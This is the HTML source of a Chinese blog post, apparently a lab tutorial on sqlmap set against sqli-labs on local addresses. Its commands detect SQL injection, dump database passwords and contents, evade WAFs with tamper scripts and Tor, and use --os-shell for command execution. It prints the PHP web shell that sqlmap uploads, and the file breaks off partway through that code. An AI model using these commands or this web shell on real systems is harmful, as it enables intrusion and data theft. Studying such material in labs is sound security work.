@@ -1,0 +1,308 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>反弹shell | DropAnn</title><meta name="keywords" content="Web安全"><meta name="author" content="DropAnn"><meta name="copyright" content="DropAnn"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="E:\att_tools\web_tools\sql injection\sqlmap 基本使用探测指定url是否存在SQL注入 无需登录 1sqlmap -u  &quot;url&quot;  #探测该url是否存在漏洞  需要登录 cookie 1sqlmap -u  &quot;url&quot;   --cookie&#x3D;&quot;抓取的cookie&quot;  #探测该url是否存在漏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹shell">
+<meta property="og:url" content="https://dropann.github.io/p/2f610211.html">
+<meta property="og:site_name" content="DropAnn">
+<meta property="og:description" content="E:\att_tools\web_tools\sql injection\sqlmap 基本使用探测指定url是否存在SQL注入 无需登录 1sqlmap -u  &quot;url&quot;  #探测该url是否存在漏洞  需要登录 cookie 1sqlmap -u  &quot;url&quot;   --cookie&#x3D;&quot;抓取的cookie&quot;  #探测该url是否存在漏">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/86476698_p0_master1200.jpg">
+<meta property="article:published_time" content="2022-11-10T05:21:06.000Z">
+<meta property="article:modified_time" content="2022-11-10T14:25:10.546Z">
+<meta property="article:author" content="DropAnn">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/86476698_p0_master1200.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://dropann.github.io/p/2f610211"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '反弹shell',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-11-10 22:25:10'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210819224420.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">63</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-link"></i><span> 链接</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-heartbeat"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/usedlink/"><i class="fa-fw fas fa-thumbs-up"></i><span> 常用链接</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/86476698_p0_master1200.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">DropAnn</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-link"></i><span> 链接</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-heartbeat"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/usedlink/"><i class="fa-fw fas fa-thumbs-up"></i><span> 常用链接</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">反弹shell</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-10T05:21:06.000Z" title="发表于 2022-11-10 13:21:06">2022-11-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-10T14:25:10.546Z" title="更新于 2022-11-10 22:25:10">2022-11-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="反弹shell"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><code>E:\att_tools\web_tools\sql injection\sqlmap</code></p>
+<h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>探测指定url是否存在SQL注入</p>
+<p><strong>无需登录</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u  <span class="string">&quot;url&quot;</span>  <span class="comment">#探测该url是否存在漏洞</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>需要登录</strong></p>
+<p>cookie</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u  <span class="string">&quot;url&quot;</span>   --cookie=<span class="string">&quot;抓取的cookie&quot;</span>  <span class="comment">#探测该url是否存在漏洞</span></span><br></pre></td></tr></table></figure>
+
+<p>data参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --data=<span class="string">&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot;</span>  <span class="comment">#抓取其post提交的数据填入</span></span><br></pre></td></tr></table></figure>
+
+<p>探测http数据包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /sqli/Less-11/ HTTP/1.1</span><br><span class="line">Host: 192.168.10.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 38</span><br><span class="line">Referer: http://192.168.10.1/sqli/Less-11/</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"> </span><br><span class="line">uname=admin&amp;passwd=admin&amp;submit=Submit</span><br><span class="line">sqlmap -r post.txt        <span class="comment">#探测post.txt文件中的http数据包是否存在sql注入漏洞</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>用<code>-p</code>参数来指定需要探测的参数</p>
+</blockquote>
+<p><code>*</code>指定注入点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://xx.xx.xx.xx/xxxx*/?id=1&quot;</span> <span class="comment">#对url路径执行探测</span></span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://xx.xx.xx.xx/xxxx*/?id=1&quot;</span> --cookie=<span class="string">&quot;uname=admin*&quot;</span> <span class="comment">#对任意位置都可</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="数据库用户相关"><a href="#数据库用户相关" class="headerlink" title="数据库用户相关"></a>数据库用户相关</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> </span><br><span class="line">--users 			<span class="comment">#查看数据库的所有用户</span></span><br><span class="line">--passwords 		<span class="comment">#查看数据库所有用户名的密码</span></span><br><span class="line">--current-user  	<span class="comment">#查看数据库当前的用户</span></span><br><span class="line">--is-dba			<span class="comment">#判断当前用户是否有管理员权限</span></span><br><span class="line">--roles				<span class="comment">#列出数据库所有管理员角色</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="获取数据库数据"><a href="#获取数据库数据" class="headerlink" title="获取数据库数据"></a>获取数据库数据</h2><h3 id="查看所有数据库-–dbs"><a href="#查看所有数据库-–dbs" class="headerlink" title="查看所有数据库(–dbs)"></a>查看所有数据库(–dbs)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --dbs</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>查看当前数据表<code>--current-db</code></p>
+</blockquote>
+<h3 id="获取所有的表（-D-库名-–tables）"><a href="#获取所有的表（-D-库名-–tables）" class="headerlink" title="获取所有的表（-D [库名] –tables）"></a>获取所有的表（-D [库名] –tables）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> -D security --tables <span class="comment">#爆出数据库security中的所有的表</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="获取所有的列（-D-库名-T-表名-–columns）"><a href="#获取所有的列（-D-库名-T-表名-–columns）" class="headerlink" title="获取所有的列（-D [库名] -T [表名] –columns）"></a>获取所有的列（-D [库名] -T [表名] –columns）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> -D security -T users --columns</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取指定数据（-D-库名-T-表名-C-列名-–dump）"><a href="#获取指定数据（-D-库名-T-表名-C-列名-–dump）" class="headerlink" title="获取指定数据（-D [库名] -T [表名] -C [列名] –dump）"></a>获取指定数据（-D [库名] -T [表名] -C [列名] –dump）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> -D security -T users -C username --dump  <span class="comment">#爆出数据库security中的users表中的username列中的所有数据</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="数据库中所有数据-–dump-all"><a href="#数据库中所有数据-–dump-all" class="headerlink" title="数据库中所有数据(–dump-all)"></a>数据库中所有数据(–dump-all)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> -D security -T users --dump-all <span class="comment">#爆出数据库security中的users表中的所有数据</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> -D security --dump-all   <span class="comment">#爆出数据库security中的所有数据</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --dump-all  <span class="comment">#爆出该数据库中的所有数据</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="指定注入类型"><a href="#指定注入类型" class="headerlink" title="指定注入类型"></a>指定注入类型</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">–technique=(默认 BEUST)</span><br><span class="line">–technique <span class="comment">#测试指定注入类型\使用的技术</span></span><br><span class="line">不加参数默认测试所有注入技术：</span><br><span class="line">B: 基于布尔的 SQL 盲注</span><br><span class="line">E: 基于显错 sql 注入</span><br><span class="line">U: 基于 UNION 注入</span><br><span class="line">S: 叠层 sql 注入</span><br><span class="line">T: 基于时间盲注</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看详细信息"><a href="#查看详细信息" class="headerlink" title="查看详细信息"></a>查看详细信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-v VERBOSE 详细级别：0-6（默认为1）</span><br></pre></td></tr></table></figure>
+
+<h1 id="探测WAF绕过"><a href="#探测WAF绕过" class="headerlink" title="探测WAF绕过"></a>探测WAF绕过</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">--identify-waf   检测是否有WAF</span><br><span class="line"> </span><br><span class="line"><span class="comment">#使用参数进行绕过</span></span><br><span class="line">--random-agent    使用任意HTTP头进行绕过，尤其是在WAF配置不当的时候</span><br><span class="line">--time-sec=3      使用长的延时来避免触发WAF的机制，这方式比较耗时</span><br><span class="line">--hpp             使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上</span><br><span class="line">--proxy=100.100.100.100:8080 --proxy-cred=211:985      使用代理进行绕过</span><br><span class="line">--ignore-proxy    禁止使用系统的代理，直接连接进行注入</span><br><span class="line">--flush-session   清空会话，重构注入</span><br><span class="line">--hex 或者 --no-cast     进行字符码转换</span><br><span class="line">--mobile          对移动端的服务器进行注入</span><br><span class="line">--tor             匿名注入</span><br></pre></td></tr></table></figure>
+
+<h2 id="探测等级和危险等级-–level-–risk"><a href="#探测等级和危险等级-–level-–risk" class="headerlink" title="探测等级和危险等级(–level –risk)"></a>探测等级和危险等级(–level –risk)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --level=5 --risk=3 <span class="comment">#探测等级5，平台危险等级3，都是最高级别</span></span><br></pre></td></tr></table></figure>
+
+<p>Sqlmap一共有5个探测等级，默认是1。等级越高，说明探测时使用的payload也越多。其中5级的payload最多，会自动破解出cookie、XFF等头部注入。当然，等级越高，探测的时间也越慢。这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP cookie在level为2时就会测试，HTTP User-Agent/Referer头在level为3时就会测试。在不确定哪个参数为注入点时，为了保证准确性，建议设置level为5</p>
+<p>sqlmap一共有3个危险等级，也就是说你认为这个网站存在几级的危险等级。和探测等级一个意思，在不确定的情况下，建议设置为3级，–risk=3</p>
+<h2 id="伪造Http-Referer头部"><a href="#伪造Http-Referer头部" class="headerlink" title="伪造Http Referer头部"></a>伪造Http Referer头部</h2><p>Sqlmap可以在请求中伪造HTTP中的referer，当探测等级为3或者3以上时，会尝试对referer注入，可以使用referer命令来欺骗，比如，我们伪造referer头为百度。可以这样</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--referer  http://www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<h2 id="指定脚本进行绕过-–tamper"><a href="#指定脚本进行绕过-–tamper" class="headerlink" title="指定脚本进行绕过(–tamper)"></a>指定脚本进行绕过(–tamper)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  --tamper=space2comment.py  <span class="comment">#用/**/代替空格</span></span><br><span class="line">sqlmap  --tamper=<span class="string">&quot;space2comment.py,space2plus.py&quot;</span>  指定多个脚本进行过滤</span><br></pre></td></tr></table></figure>
+
+<p>脚本位置</p>
+<p>linux:<code>/usr/share/sqlmap/tamper</code></p>
+<p>windows:<code>sqlmap\tamper</code></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/SY5G_MFm9acKfv85_4udrw">sqlmap-tamper脚本整理</a></p>
+<h1 id="注入后渗透"><a href="#注入后渗透" class="headerlink" title="注入后渗透"></a>注入后渗透</h1><h2 id="执行指定的SQL语句-–sql-shell"><a href="#执行指定的SQL语句-–sql-shell" class="headerlink" title="执行指定的SQL语句(–sql-shell)"></a>执行指定的SQL语句(–sql-shell)</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2185076/1597238500793-bd7f7257-d483-4a34-9618-2fd1f22b2f0e.png" alt="img"></p>
+<p>这里的SQL语句最后不要有分号 </p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/2185076/1597250210963-a9133f05-3889-4696-9ca7-7f72871f577c.png" alt="img"></p>
+<h2 id="执行操作系统命令-–os-shell"><a href="#执行操作系统命令-–os-shell" class="headerlink" title="执行操作系统命令(–os-shell)"></a>执行操作系统命令(–os-shell)</h2><p>在数据库为MySQL、PostgreSql或者SQL Server时，可以执行该选项。</p>
+<p>当为MySQL数据库时，需满足下面三个条件：</p>
+<ul>
+<li>当前用户为 root</li>
+<li>知道网站根目录的绝对路径</li>
+<li>该数据库的 secure_file_priv 参数值为空(很多数据库的该值为NULL，这也就导致了即使当前用户是root，即使知道了网站根目录的绝对路径，也不能执行成功 –os-shell )</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u &quot;http://192.168.3.30/sql1/Less-4/?id=1&quot; --os-shell  #执行--os-shell命令</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/2185076/1597250636587-d4eed6c5-8c9e-467e-a305-1642947da666.png" alt="img"></p>
+<p>选择网站知道的脚本语言</p>
+<p>do you want sqlmap to further try to provoke the full path disclosure? [Y/n]</p>
+<p>您是否希望sqlmap进一步尝试引发完整路径的披露？【Y/n】</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/2185076/1597250731914-f576d14f-3e11-4c6c-96cd-da040ee3857c.png" alt="img"></p>
+<p>如果我们不知道网站的根目录的绝对路径的话，我们那里选择 4 暴力破解，尝试破解出根目录的绝对路径。这里因为是我们本地的环境，已经知道网站根目录的绝对地址了，所以选择 2</p>
+<ul>
+<li>【1】使用公共的默认目录(C:/xampp/htdocs/，C:/wamp/www，C:/Inetpub/wwwroot/)</li>
+<li>【2】自定义网络根目录绝对路径</li>
+<li>【3】指定自定义的路径文件</li>
+<li>【4】暴力破解</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/2185076/1597253003410-174725f9-aaff-46c8-add8-c3e4cf71ac0a.png" alt="img"></p>
+<p>如果报错，无写入权限，修改my.ini</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secure_auth = ON</span><br><span class="line">secure_file_priv = &quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/2185076/1597253142283-81b2ff23-2114-41f9-bf63-01aaa0395f2e.png" alt="img"></p>
+<p>执行os-shell的过程中，sqlmap向网站根目录写入两个文件 tmpbxttd.php 和 tmpumosw.php。真正的木马文件是tmpbxttd.php 。如果是非正常退出sqlmap的话，这两个文件不会被删除。只有当我们输入 x 或 q 退出 sqlmap 时，该文件才会被自动删除。</p>
+<p> <code>tmpbxttd.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">@ini_set(<span class="string">&quot;max_execution_time&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$z</span> = @ini_get(<span class="string">&quot;disable_functions&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$z</span>)) &#123;</span><br><span class="line">    <span class="variable">$z</span> = preg_replace(<span class="string">&quot;/[, ]+/&quot;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="variable">$z</span>);</span><br><span class="line">    <span class="variable">$z</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$z</span>);</span><br><span class="line">    <span class="variable">$z</span> = array_map(<span class="string">&quot;trim&quot;</span>, <span class="variable">$z</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$z</span> = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$c</span> . <span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$z</span>;</span><br><span class="line">    <span class="keyword">return</span> is_callable(<span class="variable">$n</span>) <span class="keyword">and</span> !in_array(<span class="variable">$n</span>, <span class="variable">$z</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (f(<span class="string">&quot;system&quot;</span>)) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    system(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$w</span> = ob_get_clean();</span><br><span class="line">&#125; <span class="keyword">elseif</span> 